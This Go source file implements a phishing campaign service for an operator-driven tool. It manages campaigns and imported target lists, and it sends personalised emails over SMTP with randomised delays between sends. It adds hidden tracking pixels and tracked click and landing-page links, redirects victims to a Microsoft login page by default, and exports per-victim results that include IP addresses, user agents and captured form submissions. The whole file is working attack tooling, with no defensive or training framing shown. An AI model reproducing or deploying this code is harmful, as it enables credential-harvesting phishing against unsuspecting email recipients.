package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/smtp"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// ============================================================================
// Call Handlers
// ============================================================================

func (s *PhishingService) HandleCampaignCreate(operator string, args string) {
	var c Campaign
	if err := json.Unmarshal([]byte(args), &c); err != nil {
		s.sendError(operator, "Invalid campaign data: "+err.Error())
		return
	}

	c.ID = generateID()
	c.Status = "draft"
	c.CreatedAt = nowUnix()
	c.CreatedBy = operator

	if c.RedirectURL == "" {
		c.RedirectURL = "https://login.microsoftonline.com"
	}
	if c.SendDelay == 0 {
		c.SendDelay = 3
	}

	if err := s.SaveCampaign(c); err != nil {
		s.sendError(operator, "Failed to save campaign: "+err.Error())
		return
	}

	s.sendResponseAll("campaigns", s.ListCampaignsWithStats())
}

func (s *PhishingService) HandleCampaignList(operator string) {
	s.sendResponseClient(operator, "campaigns", s.ListCampaignsWithStats())
}

func (s *PhishingService) HandleCampaignDelete(operator string, args string) {
	var req struct {
		ID string `json:"id"`
	}
	if err := json.Unmarshal([]byte(args), &req); err != nil {
		s.sendError(operator, "Invalid request")
		return
	}

	s.mu.Lock()
	if ch, ok := s.stopChans[req.ID]; ok {
		close(ch)
		delete(s.stopChans, req.ID)
	}
	s.mu.Unlock()

	s.DeleteCampaign(req.ID)
	s.sendResponseAll("campaigns", s.ListCampaignsWithStats())
}

func (s *PhishingService) HandleCampaignStart(operator string, args string) {
	var req struct {
		ID string `json:"id"`
	}
	if err := json.Unmarshal([]byte(args), &req); err != nil {
		s.sendError(operator, "Invalid request")
		return
	}

	campaign, err := s.LoadCampaign(req.ID)
	if err != nil {
		s.sendError(operator, "Campaign not found")
		return
	}

	if campaign.Status == "running" {
		s.sendError(operator, "Campaign is already running")
		return
	}

	targets := s.LoadTargets(campaign.ID)
	if len(targets) == 0 {
		s.sendError(operator, "No targets for this campaign")
		return
	}

	campaign.Status = "running"
	s.SaveCampaign(campaign)

	stopChan := make(chan struct{})
	s.mu.Lock()
	s.stopChans[campaign.ID] = stopChan
	s.mu.Unlock()

	s.sendResponseAll("campaigns", s.ListCampaignsWithStats())

	go s.SendCampaign(operator, campaign, targets, stopChan)
}

func (s *PhishingService) HandleCampaignStop(operator string, args string) {
	var req struct {
		ID string `json:"id"`
	}
	if err := json.Unmarshal([]byte(args), &req); err != nil {
		s.sendError(operator, "Invalid request")
		return
	}

	s.mu.Lock()
	if ch, ok := s.stopChans[req.ID]; ok {
		close(ch)
		delete(s.stopChans, req.ID)
	}
	s.mu.Unlock()

	campaign, err := s.LoadCampaign(req.ID)
	if err != nil {
		return
	}
	campaign.Status = "paused"
	s.SaveCampaign(campaign)
	s.sendResponseAll("campaigns", s.ListCampaignsWithStats())
}

func (s *PhishingService) HandleTargetsImport(operator string, args string) {
	var req struct {
		CampaignID string `json:"campaign_id"`
		CSV        string `json:"csv"`
	}
	if err := json.Unmarshal([]byte(args), &req); err != nil {
		s.sendError(operator, "Invalid request")
		return
	}

	existing := s.LoadTargets(req.CampaignID)
	newTargets := parseCSV(req.CSV, req.CampaignID)

	combined := append(existing, newTargets...)
	if err := s.SaveTargets(req.CampaignID, combined); err != nil {
		s.sendError(operator, "Failed to save targets: "+err.Error())
		return
	}

	s.sendResponseAll("targets", map[string]interface{}{
		"campaign_id": req.CampaignID,
		"targets":     combined,
	})
	s.sendResponseAll("campaigns", s.ListCampaignsWithStats())
}

func (s *PhishingService) HandleTargetsList(operator string, args string) {
	var req struct {
		CampaignID string `json:"campaign_id"`
	}
	if err := json.Unmarshal([]byte(args), &req); err != nil {
		s.sendError(operator, "Invalid request")
		return
	}

	targets := s.LoadTargets(req.CampaignID)
	s.sendResponseClient(operator, "targets", map[string]interface{}{
		"campaign_id": req.CampaignID,
		"targets":     targets,
	})
}

func (s *PhishingService) HandleTargetsDelete(operator string, args string) {
	var req struct {
		CampaignID string   `json:"campaign_id"`
		IDs        []string `json:"ids"`
	}
	if err := json.Unmarshal([]byte(args), &req); err != nil {
		s.sendError(operator, "Invalid request")
		return
	}

	targets := s.LoadTargets(req.CampaignID)
	idSet := make(map[string]bool)
	for _, id := range req.IDs {
		idSet[id] = true
	}

	var filtered []Target
	for _, t := range targets {
		if !idSet[t.ID] {
			filtered = append(filtered, t)
		}
	}

	s.SaveTargets(req.CampaignID, filtered)
	s.sendResponseAll("targets", map[string]interface{}{
		"campaign_id": req.CampaignID,
		"targets":     filtered,
	})
	s.sendResponseAll("campaigns", s.ListCampaignsWithStats())
}

func (s *PhishingService) HandleResultsList(operator string, args string) {
	var req struct {
		CampaignID string `json:"campaign_id"`
	}
	if err := json.Unmarshal([]byte(args), &req); err != nil {
		s.sendError(operator, "Invalid request")
		return
	}

	results := s.LoadResults(req.CampaignID)
	s.sendResponseClient(operator, "results", map[string]interface{}{
		"campaign_id": req.CampaignID,
		"results":     results,
	})
}

func (s *PhishingService) HandleResultsExport(operator string, args string) {
	var req struct {
		CampaignID string `json:"campaign_id"`
	}
	if err := json.Unmarshal([]byte(args), &req); err != nil {
		s.sendError(operator, "Invalid request")
		return
	}

	results := s.LoadResults(req.CampaignID)
	csv := resultsToCSV(results)
	s.sendResponseClient(operator, "export", map[string]interface{}{
		"campaign_id": req.CampaignID,
		"csv":         csv,
	})
}

func (s *PhishingService) HandleTemplatesList(operator string) {
	templates := s.listFiles("templates")
	s.sendResponseClient(operator, "templates", templates)
}

func (s *PhishingService) HandleLandersList(operator string) {
	landers := s.listFiles("landers")
	s.sendResponseClient(operator, "landers", landers)
}

func (s *PhishingService) HandleTemplatePreview(operator string, args string) {
	var req struct {
		Type string `json:"type"` // "template" or "lander"
		Name string `json:"name"`
	}
	if err := json.Unmarshal([]byte(args), &req); err != nil {
		s.sendError(operator, "Invalid preview request")
		return
	}

	var html string
	if req.Type == "lander" {
		html = s.loadLander(req.Name)
	} else {
		html = s.loadTemplate(req.Name)
	}

	if html == "" {
		s.sendError(operator, "Template not found: "+req.Name)
		return
	}

	// Replace template variables with example values
	replacer := strings.NewReplacer(
		"{{.FirstName}}", "John",
		"{{.LastName}}", "Doe",
		"{{.Email}}", "john.doe@contoso.com",
		"{{.Company}}", "Contoso Ltd",
		"{{.Position}}", "IT Manager",
		"{{.ClickURL}}", "#",
		"{{.TrackingURL}}", "#",
		"{{.SubmitURL}}", "#",
		"{{.Custom}}", "",
	)
	html = replacer.Replace(html)

	resp := map[string]interface{}{
		"preview_type": req.Type,
		"name":         req.Name,
		"html":         html,
	}
	s.sendResponseClient(operator, "preview", resp)
}

// ============================================================================
// Campaign Sending
// ============================================================================

func (s *PhishingService) SendCampaign(operator string, campaign Campaign, targets []Target, stopChan chan struct{}) {
	templateContent := s.loadTemplate(campaign.Template)
	if templateContent == "" {
		s.sendError(operator, "Failed to load email template: "+campaign.Template)
		campaign.Status = "draft"
		s.SaveCampaign(campaign)
		s.sendResponseAll("campaigns", s.ListCampaignsWithStats())
		return
	}

	results := s.LoadResults(campaign.ID)
	sentIDs := make(map[string]bool)
	for _, r := range results {
		sentIDs[r.TargetID] = true
	}

	for _, target := range targets {
		select {
		case <-stopChan:
			campaign.Status = "paused"
			s.SaveCampaign(campaign)
			s.sendResponseAll("campaigns", s.ListCampaignsWithStats())
			return
		default:
		}

		if sentIDs[target.ID] {
			continue
		}

		trackingID := generateTrackingID()
		result := Result{
			ID:         trackingID,
			CampaignID: campaign.ID,
			TargetID:   target.ID,
			Email:      target.Email,
			FirstName:  target.FirstName,
			LastName:   target.LastName,
			Status:     "sending",
		}

		body := renderEmailTemplate(templateContent, campaign, target, trackingID)

		err := sendEmail(campaign, target, body)
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			result.Status = "sent"
			result.SentAt = nowUnix()
		}

		results = append(results, result)
		s.SaveResults(campaign.ID, results)

		s.sendEvent("email_sent", result)

		delay := campaign.SendDelay
		if delay > 0 {
			jitter := rand.Intn(delay/2+1) - delay/4
			time.Sleep(time.Duration(delay+jitter) * time.Second)
		}
	}

	campaign.Status = "completed"
	s.SaveCampaign(campaign)
	s.sendResponseAll("campaigns", s.ListCampaignsWithStats())
}

// ============================================================================
// SMTP
// ============================================================================

func sendEmail(campaign Campaign, target Target, htmlBody string) error {
	from := campaign.SenderEmail
	to := target.Email

	headers := make(map[string]string)
	headers["From"] = fmt.Sprintf("%s <%s>", campaign.SenderName, from)
	headers["To"] = to
	headers["Subject"] = renderSubject(campaign.Subject, target)
	headers["MIME-Version"] = "1.0"
	headers["Content-Type"] = "text/html; charset=UTF-8"

	var msg bytes.Buffer
	for k, v := range headers {
		msg.WriteString(fmt.Sprintf("%s: %s\r\n", k, v))
	}
	msg.WriteString("\r\n")
	msg.WriteString(htmlBody)

	addr := fmt.Sprintf("%s:%d", campaign.SmtpHost, campaign.SmtpPort)

	if campaign.SmtpTLS {
		return sendEmailTLS(addr, campaign.SmtpUser, campaign.SmtpPass, from, to, msg.Bytes())
	}

	var auth smtp.Auth
	if campaign.SmtpUser != "" {
		auth = smtp.PlainAuth("", campaign.SmtpUser, campaign.SmtpPass, campaign.SmtpHost)
	}

	return smtp.SendMail(addr, auth, from, []string{to}, msg.Bytes())
}

func sendEmailTLS(addr string, user string, pass string, from string, to string, msg []byte) error {
	host := strings.Split(addr, ":")[0]

	tlsConfig := &tls.Config{
		ServerName: host,
	}

	conn, err := tls.Dial("tcp", addr, tlsConfig)
	if err != nil {
		return err
	}

	client, err := smtp.NewClient(conn, host)
	if err != nil {
		return err
	}
	defer client.Close()

	if user != "" {
		auth := smtp.PlainAuth("", user, pass, host)
		if err = client.Auth(auth); err != nil {
			return err
		}
	}

	if err = client.Mail(from); err != nil {
		return err
	}
	if err = client.Rcpt(to); err != nil {
		return err
	}

	w, err := client.Data()
	if err != nil {
		return err
	}
	w.Write(msg)
	w.Close()

	return client.Quit()
}

// ============================================================================
// Template Rendering
// ============================================================================

func renderEmailTemplate(template string, campaign Campaign, target Target, trackingID string) string {
	baseURL := strings.TrimRight(campaign.BaseURL, "/")

	trackingURL := fmt.Sprintf("%s/px/%s.png", baseURL, trackingID)
	clickURL := fmt.Sprintf("%s/cl/%s", baseURL, trackingID)
	landerURL := fmt.Sprintf("%s/lp/%s", baseURL, trackingID)

	r := strings.NewReplacer(
		"{{.FirstName}}", target.FirstName,
		"{{.LastName}}", target.LastName,
		"{{.Email}}", target.Email,
		"{{.Company}}", target.Company,
		"{{.Position}}", target.Position,
		"{{.Custom}}", target.Custom,
		"{{.TrackingURL}}", trackingURL,
		"{{.ClickURL}}", clickURL,
		"{{.LanderURL}}", landerURL,
		"{{.Subject}}", campaign.Subject,
		"{{.SenderName}}", campaign.SenderName,
		"{{.SenderEmail}}", campaign.SenderEmail,
	)
	body := r.Replace(template)

	if campaign.TrackOpens && !strings.Contains(body, trackingURL) {
		pixel := fmt.Sprintf(`<img src="%s" width="1" height="1" style="display:none" alt="">`, trackingURL)
		if idx := strings.LastIndex(body, "</body>"); idx >= 0 {
			body = body[:idx] + pixel + body[idx:]
		} else {
			body += pixel
		}
	}

	return body
}

func renderSubject(subject string, target Target) string {
	r := strings.NewReplacer(
		"{{.FirstName}}", target.FirstName,
		"{{.LastName}}", target.LastName,
		"{{.Email}}", target.Email,
		"{{.Company}}", target.Company,
		"{{.Position}}", target.Position,
	)
	return r.Replace(subject)
}

// ============================================================================
// CSV Parsing
// ============================================================================

func parseCSV(csvData string, campaignID string) []Target {
	var targets []Target
	lines := strings.Split(strings.TrimSpace(csvData), "\n")
	if len(lines) < 2 {
		return targets
	}

	header := strings.Split(strings.TrimSpace(lines[0]), ",")
	colMap := make(map[string]int)
	for i, h := range header {
		colMap[strings.ToLower(strings.TrimSpace(h))] = i
	}

	for _, line := range lines[1:] {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		cols := strings.Split(line, ",")

		t := Target{
			ID:         generateID(),
			CampaignID: campaignID,
		}

		if idx, ok := colMap["email"]; ok && idx < len(cols) {
			t.Email = strings.TrimSpace(cols[idx])
		}
		if idx, ok := colMap["first_name"]; ok && idx < len(cols) {
			t.FirstName = strings.TrimSpace(cols[idx])
		} else if idx, ok := colMap["firstname"]; ok && idx < len(cols) {
			t.FirstName = strings.TrimSpace(cols[idx])
		}
		if idx, ok := colMap["last_name"]; ok && idx < len(cols) {
			t.LastName = strings.TrimSpace(cols[idx])
		} else if idx, ok := colMap["lastname"]; ok && idx < len(cols) {
			t.LastName = strings.TrimSpace(cols[idx])
		}
		if idx, ok := colMap["position"]; ok && idx < len(cols) {
			t.Position = strings.TrimSpace(cols[idx])
		}
		if idx, ok := colMap["company"]; ok && idx < len(cols) {
			t.Company = strings.TrimSpace(cols[idx])
		}
		if idx, ok := colMap["custom"]; ok && idx < len(cols) {
			t.Custom = strings.TrimSpace(cols[idx])
		}

		if t.Email != "" {
			targets = append(targets, t)
		}
	}

	return targets
}

func resultsToCSV(results []Result) string {
	var buf bytes.Buffer
	buf.WriteString("email,first_name,last_name,status,sent_at,opened_at,clicked_at,submit_at,remote_ip,user_agent,submit_data\n")
	for _, r := range results {
		buf.WriteString(fmt.Sprintf("%s,%s,%s,%s,%d,%d,%d,%d,%s,%s,%s\n",
			r.Email, r.FirstName, r.LastName, r.Status,
			r.SentAt, r.OpenedAt, r.ClickedAt, r.SubmitAt,
			r.RemoteIP, r.UserAgent, r.SubmitData,
		))
	}
	return buf.String()
}

// ============================================================================
// File Helpers
// ============================================================================

func (s *PhishingService) loadTemplate(name string) string {
	path := filepath.Join(s.moduleDir, "templates", name)
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	return string(data)
}

func (s *PhishingService) loadLander(name string) string {
	path := filepath.Join(s.moduleDir, "landers", name)
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	return string(data)
}

func (s *PhishingService) listFiles(subdir string) []string {
	var files []string
	dir := filepath.Join(s.moduleDir, subdir)
	entries, err := os.ReadDir(dir)
	if err != nil {
		return files
	}
	for _, e := range entries {
		if !e.IsDir() && strings.HasSuffix(e.Name(), ".html") {
			files = append(files, e.Name())
		}
	}
	return files
}

// ListCampaignsWithStats returns all campaigns enriched with their stats.
func (s *PhishingService) ListCampaignsWithStats() []map[string]interface{} {
	campaigns := s.ListCampaigns()
	var result []map[string]interface{}
	for _, c := range campaigns {
		stats := s.GetCampaignStats(c.ID)
		entry := map[string]interface{}{
			"id":            c.ID,
			"name":          c.Name,
			"status":        c.Status,
			"smtp_host":     c.SmtpHost,
			"smtp_port":     c.SmtpPort,
			"smtp_user":     c.SmtpUser,
			"smtp_pass":     c.SmtpPass,
			"smtp_tls":      c.SmtpTLS,
			"sender_email":  c.SenderEmail,
			"sender_name":   c.SenderName,
			"subject":       c.Subject,
			"template":      c.Template,
			"lander":        c.Lander,
			"track_opens":   c.TrackOpens,
			"track_clicks":  c.TrackClicks,
			"base_url":      c.BaseURL,
			"redirect_url":  c.RedirectURL,
			"send_delay":    c.SendDelay,
			"created_at":    c.CreatedAt,
			"created_by":    c.CreatedBy,
			"total_targets": stats.TotalTargets,
			"sent":          stats.Sent,
			"opened":        stats.Opened,
			"clicked":       stats.Clicked,
			"submitted":     stats.Submitted,
			"errors":        stats.Errors,
		}
		result = append(result, entry)
	}
	return result
}
